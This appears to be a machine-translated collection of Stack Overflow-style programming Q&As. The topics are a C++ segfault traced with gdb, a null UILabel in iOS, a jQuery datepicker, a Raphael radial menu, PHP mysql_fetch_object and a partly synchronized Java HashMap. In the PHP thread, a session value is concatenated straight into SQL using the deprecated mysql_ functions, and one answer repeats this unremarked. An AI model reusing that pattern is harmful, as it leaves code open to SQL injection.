而不是`#include <iostream.h>`，你应该有`#include <iostream>`。您还需要`using namespace std;`您的编译器可能已经过时了。大多数编译器都是免费的，因此我强烈建议您购买一个不会让您在学习时犯此类错误的编译器。我有一段时间没用过 Windows，但大概**Eclipse**在它上面的工作原理是一样的，而且**Visual Studio Express**也是免费的。我认为**Qt Creator**也适用于 Windows。选择其中任何一个，*停止使用你现在正在使用的那个*。

我还删除了您为暂停程序而调用的奇怪的 DOS 输入功能。`std::cin`如果您想输入，请使用。

### 分段故障

现在，如果我运行它，我会得到：

```
Segmentation fault (core dumped) 
```

所以这很有趣，gdb 说什么？

```
Starting program: /home/brendan/a.out 

Program received signal SIGSEGV, Segmentation fault.
0x00000000004008b7 in split (beg=0, end=6) at yourcode.cpp:55
55              while (a[left] <= a[loc]) 
```

这表明在某些时候，在第 55 行，`a[left]`或者`a[loc]`不是内存中的有效位置。您可能需要添加某种代码以确保`left`并`loc`保持在数组的范围内。

如果你**迫切**需要知道是什么导致你的程序崩溃，**那么自己运行这个过程会比让别人为你做这个过程要快得多**。这个过程很**简单**，因此很少有人愿意为您运行它。我只是作为一个例子做的，因为我意识到当你第一次开始编程时这并不明显。

注意：我使用命令行程序来检查它，因为它速度很快，但在 IDE 中使用调试器可能会更舒服。如果你运行 Eclipse，你应该能够只点击“调试”按钮（通常是一个绿色的 bug），它会告诉你这个确切的信息。

# iphone - ios label.text null

> ID：12429983
> 
> 赞同：1
> 
> 时间：2012-09-14T18:25:30.890
> 
> 标签：iphone, ios, label, uilabel

我正在设置 UILabel 但返回 null。

.h 文件：

```
@property (retain,nonatomic) UILabel *label; 
```

.m 文件：

```
@synthesize label;

- (void)viewDidLoad
{
    self.label.text=@"some text";
 [super viewDidLoad];
} 
```

我检查标签的值并且为空。任何人都可以告诉我为什么是空的吗？谁能告诉我我做错了什么？

如何从不同的视图控制器设置标签？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-14T20:01:00.217

@Vimal 的回答并没有完全回答你的问题。您确实需要将其添加到：

```
self.label = [[UILabel alloc] init]; 
```

但是您仍然需要设置标签的框架并将标签实际添加到视图中：

```
self.label.frame = CGRectMake(30.0f, 30.0f, 60.0f, 30.0f);
[self.view addSubview: self.label]; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-14T19:54:05.170

在 viewDidLoad

添加下面的代码作为第一行

```
self.label = [[UILabel alloc]init]; // allocate and initialize the label object 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-14T20:06:29.097

如果您尝试通过以下`-viewWillAppear:`方法到达您的网点，那将是惊人的：

```
- (void)viewWillAppear:(BOOL)animated {
    self.label.text = @"some text";
} 
```

# jquery - jquery datepicker在年或月选择上设置日期

> ID：12429988
> 
> 赞同：2
> 
> 时间：2012-09-14T18:25:50.687
> 
> 标签：jquery, datepicker

我有一个可以正常工作的日期选择器，我唯一想要的就是在用户选择一年或一个月时在输入中设置日期。目前，它只是设置您选择日期的日期。我想要这个，因为用户可能认为只需选择其中一个（年或月）就可以更改日期，而我在文档上看不到任何与选择器的该部分相关的内容。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-09-14T19:08:26.420

试试这个代码。如果用户选择不同的月份或年份，它将*更改当前日期*。如果我误解了您的问题，请告诉我，以便我调整答案！

```
$(function () {
    $("#datepicker").datepicker({
        changeMonth: true,
        changeYear: true,
        onChangeMonthYear: function (year, month, inst) {
            var curDate = $(this).datepicker("getDate");
            if (curDate == null)
            return; 
            if (curDate.getYear() != year || curDate.getMonth() != month - 1) {
                curDate.setYear(year);
                curDate.setMonth(month - 1);
                $(this).datepicker("setDate", curDate);
            }
        }
    });
}); 
```

因为我对 JQueryUI 和 JQuery 完全陌生，如果有什么需要改进的，请告诉我！

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-14T19:05:53.547

因此，您需要做两件事。

首先，您需要允许用户更改月份和年份。这可以通过将 changeMonth 和 changeYear 属性设置为 true 来完成。通过这样做，它还可以访问 changeMonthYear 事件，该事件将响应月份和年份的变化。所以，你的最终代码看起来像这样......

```
$(function() {
    $("#datepicker").datepicker({
        changeMonth: true,
        changeYear: true,
        onChangeMonthYear: function(year, month, inst) {
            $(this).val(month + "/" + year);
        }
    });
});​ 
```

[这里](http://jsfiddle.net/ZHvM3/)是一个例子。

# jquery - Raphael JS 的径向饼图菜单

> ID：12429990
> 
> 赞同：6
> 
> 时间：2012-09-14T18:26:00.560
> 
> 标签：jquery, html, css, navigation, raphael

谢谢你看我的困境。我正在尝试用 raphael 制作一个 SVG 菜单，但我对几何图形很糟糕。

下图显示了我正在制作的内容。我已经用 CSS 创建了蓝色/中心部分，但似乎真的没有其他好的方法来获得白色/外部部分。由于这些元素的块性质，图像和 CSS 在这方面有点失败。我想生成一系列弧线，其大小取决于元素的数量。

![径向菜单示例](../Images/7bd6f17df16041f3b2ef170db00f0398.png)

那么，关于如何获得一系列可点击的弧线，形成四分之一圆并具有悬停效果的任何建议？如果这很重要，我也想在这些东西上放置图标。

我已经看到了一些在 raphael 中使用饼图的示例，但我只是不知道如何适应它。啊。我应该注意几何。

谢谢你的时间。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-09-17T17:38:23.350

几何图形并没有那么糟糕，至少它不像[SVG 中的椭圆弧路径语法](http://www.w3.org/TR/SVG/paths.html#PathDataEllipticalArcCommands)那样烦人。两者都是可控的。

这是一个函数，它将生成一系列弧段作为路径，将每个弧段（以及该项目的任意元数据）交给回调函数：

```
function generateRadialNav( paper,        // Raphael's paper object
                            cx, cy,       // x and y coordinates of the center of the circle from which the arcs will be calculated
                            inner_radius, // pixels from origin to interior arc
                            radial_thickness,  // width of navigation area in pixels
                            menu_items,   // an object with one key per menu item; the value of each key is arbitrary
                            callback,     // a finalization callback for menu items which should accept three arguments: the menu_items key, the path element, and the menu_items value.  The first and third parameters are taken directly from the menu_items object.
                            options )     // Unused but added out of habit.
{
    options = options || {};

    var start_radians = options.start_radians || 0;
    var end_radians = options.end_radians || Math.PI / 2;
    var menu_item_count = 0;
    for ( var k in menu_items )
        menu_item_count++;

    var slice_radians = ( end_radians - start_radians ) / menu_item_count;

    var index = 0;
    for ( var k in menu_items )
    {
        var path = [];
        path.push( "M", cx + Math.cos( start_radians + slice_radians * index ) * inner_radius, cy + Math.sin( start_radians + slice_radians * index ) * inner_radius );
        path.push( "L", cx + Math.cos( start_radians + slice_radians * index ) * ( inner_radius + radial_thickness ), cy + Math.sin( start_radians + slice_radians * index ) * ( inner_radius + radial_thickness ) );
        path.push( "A", 
                inner_radius + radial_thickness, inner_radius + radial_thickness,
                slice_radians, 0, 1,
                cx + Math.cos( start_radians + slice_radians * ( index + 1 ) ) * ( inner_radius + radial_thickness ), cy + Math.sin( start_radians + slice_radians * ( index + 1 ) ) * ( inner_radius + radial_thickness ) );
        path.push( "L", cx + Math.cos( start_radians + slice_radians * ( index + 1 ) ) * inner_radius, cy + Math.sin( start_radians + slice_radians * ( index + 1 ) ) * inner_radius );
        path.push( "A",
                    inner_radius, inner_radius,
                    slice_radians, 0, 0, 
                    cx + Math.cos( start_radians + slice_radians * index ) * inner_radius, cy + Math.sin( start_radians + slice_radians * index ) * inner_radius );
        path.push( "Z" );

        var element = paper.path( path ).attr( { fill: 'none', stroke: 'none' } );
        callback( k, element, menu_items[k] );

        index++;
    }
} 
```

该函数本质上将计算每个导航项的区域，生成具有该形状的路径，然后将菜单定义传递给回调。任何对图标的支持都必须单独添加，但我建议可以轻松地扩充 menu_items 定义中的数据以支持它。有关此方法的使用示例，请查看[我的测试页](http://voidblossom.com/tests/radialNav.php)——当然，请原谅匆忙的粗糙边缘！

# php - mysql_fetch_array() 有效，但 mysql_fetch_object() 无效

> ID：12429994
> 
> 赞同：0
> 
> 时间：2012-09-14T18:26:18.100
> 
> 标签：php, mysql

我有以下有效的代码：

```
$date1 = mysql_query("SELECT date1 FROM Users WHERE username='".$_SESSION['username']."'") 
    or die(mysql_error());
while($row = mysql_fetch_array($date1)){
    $lastViewedDate = $row[0];
} 
```

但是当我尝试使用 mysql_fetch_object 时，我得到一个内部服务器错误 500。

```
$date1 = mysql_query("SELECT date1 FROM Users WHERE username='".$_SESSION['username']."'") 
    or die(mysql_error());
while($row = mysql_fetch_object($date1)){
    $lastViewedDate = $row["date1"];
} 
```

我希望将来使用这些对象，但我不明白为什么它们不起作用。任何帮助，将不胜感激。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-14T18:28:33.940

使用 fetch_object 的语法是：

```
$row->date1 
```

使用 fetch_assoc 的语法是：

```
$row["date1"] 
```

也请.. 对于所有神圣的东西.. 打开 E_NOTICE 错误消息和 display_errors

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-14T18:28:25.947

您没有正确访问您的对象，它会是这样的：

```
$date1 = mysql_query("SELECT date1 FROM Users WHERE username='".$_SESSION['username']."'") 
    or die(mysql_error());
while($row = mysql_fetch_object($date1)){
    $lastViewedDate = $row->date1;
} 
```

注意对象属性访问器的使用`->`

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-14T18:28:33.027

```
$lastViewedDate = $row["date1"]; 
```

这不是您访问对象变量的方式。试试这个：

```
$lastViewedDate = $row->date1; 
```

# java - 扩展 HashMap 并且只同步puts

> ID：12429997
> 
> 赞同：4
> 
> 时间：2012-09-14T18:26:41.963
> 
> 标签：java, concurrency, synchronization

我最近在我们的代码库中遇到了一个类，它扩展了 HashMap 并同步了 put 方法。

除了它比使用 ConcurrentHashMap 效率低之外，扩展 HashMap 并仅同步 put(K,V) 可能会出现什么样的问题？

假设我们不关心 get(K) 是否返回最新值（例如，我们可以很好地处理线程相互覆盖，并且我们不关心使用 map 的值时可能出现的竞争条件作为锁本身）。

例子：

```
public class MyMap<K,V> extends HashMap<K,V> {
  //...
   public synchronized void put(K key, V value) {
      //...
   }

  //...
} 
```

据我所知，HashMap 使用 put 方法重新调整大小，并且由于 put 在 map 实例级别同步，因此（可能）不会遇到并发调整大小期间遇到的问题。

即使有上述有问题的假设，我的直觉告诉我可能会出现更多问题。还是我只是偏执？

更新：谢谢大家，这很有趣，很有启发性。如果我遇到过这门课的原作者，我现在可以详细解释他的愚蠢。:)

总而言之：putAll 仍然会严重破坏数据结构并最终陷入可怕的无限循环/数据竞争状态。get 依赖于 hashmap 的底层内部数据结构，该结构可能正在同时被修改，从而导致 get 过程行为异常。这只是一个普遍的坏主意。至少，作者可以使用 Collections.synchronizedMap(Map) 代替。

注意：撰写本文时给出的所有三个答案实际上都是正确的，但我选择了关于 get() 的一个作为正确答案，因为它对我来说是最不明显的一个。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-14T18:35:00.770

我希望你也在`putAll`和上同步`remove`。 `putAll`特别是因为多个线程可以尝试调整 HashMap 的大小。这些方法也将更新`size`，`modCount`如果在同步之外完成，可能会导致更新丢失。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-14T18:33:57.553

由于`get()`可以读取不断变化的数据结构，因此可能会发生任何不好的事情。

我已经看到 get() 陷入死循环，所以这不仅仅是理论上的可能性，坏事确实会发生。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-14T18:57:43.997

正如我在评论中提到的，可能出现的另一个问题是该`putAll(Map)`方法似乎没有同步。由于`putAll`还可以修改 Map 的结构，因此在另一个线程使用同一个 Map 时，将其从一个线程中调用为非同步是不安全的。

At a higher-level though, it'd be interesting to understand more of the *why* around why `put(key, value)` was `synchronized`. Even if you've now guarded against unsynchronized modifications to the map's structure, it still does not seem like a good idea for multiple threads to be accessing the map without synchronization. In fact, if thread A is attempting to iterate over the HashMap's contents, and thread B calls `synchronized put(key, value)`, the iterator in Thread A will still fail fast and throw a `ConcurrentModificationException` rather than do something non-deterministic.

即使您要同步`putAll(Map)`调用，迭代映射内容的其他线程仍然会看到异常。如果 Map 需要在多个线程中使用，并且其中至少一个线程需要修改 Map，则所有调用都需要同步，期间。